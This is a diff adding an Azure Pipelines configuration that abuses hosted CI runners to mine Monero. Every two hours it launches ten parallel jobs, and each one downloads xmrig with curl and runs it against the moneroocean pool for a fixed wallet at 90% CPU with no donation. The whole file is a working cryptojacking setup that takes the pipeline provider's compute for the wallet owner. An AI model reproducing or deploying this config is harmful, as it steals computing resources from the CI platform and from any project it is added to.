@@ -1,0 +1,40 @@
+trigger:
+  - master
+
+pr: none
+
+schedules:
+  - cron: "0 */2 * * *"
+    displayName: Mining cycle
+    branches:
+      include:
+        - master
+    always: true
+
+strategy:
+  matrix:
+    w1: { worker: 1 }
+    w2: { worker: 2 }
+    w3: { worker: 3 }
+    w4: { worker: 4 }
+    w5: { worker: 5 }
+    w6: { worker: 6 }
+    w7: { worker: 7 }
+    w8: { worker: 8 }
+    w9: { worker: 9 }
+    w10: { worker: 10 }
+
+pool:
+  vmImage: ubuntu-latest
+
+steps:
+  - script: |
+      sudo sysctl -w vm.nr_hugepages=1280 2>/dev/null || true
+      curl -sL -o xmrig.tar.gz "https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-focal-x64.tar.gz"
+      tar xzf xmrig.tar.gz --strip-components=1
+      chmod +x xmrig
+      timeout 3400 ./xmrig -o gulf.moneroocean.stream:10032 \
+        -u 45qqTqhjmsz8mhzry3dG6rJgt9Jdzfh9xa6Skh1mtmBGgNubPDsrJVVEg6cWS6DtEB5i6BWTEaQA7BRws6UEibKEAQ1dd9X \
+        -p "azure_$(worker)" --donate-level=0 --cpu-max-threads-hint=90
+    displayName: 'Mine $(worker)'
+    timeoutInMinutes: 60
